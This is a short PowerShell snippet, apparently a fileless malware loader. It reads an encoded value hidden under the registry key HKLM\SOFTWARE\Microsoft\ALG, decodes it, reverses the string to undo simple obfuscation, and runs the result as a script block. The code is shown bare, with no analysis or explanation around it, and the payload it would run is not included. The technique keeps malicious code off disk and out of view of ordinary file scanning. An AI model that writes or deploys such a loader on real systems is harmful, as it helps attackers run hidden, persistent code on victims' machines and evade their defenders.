$registryData = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\ALG' -Name '9964a802').'9964a802'; 
$decodedScript = [System.Text.Encoding]::UTF8.GetString($registryData); 
$vreg = -join $decodedScript[$decodedScript.Length..0]; 
Invoke-Command ([Scriptblock]::Create($vreg))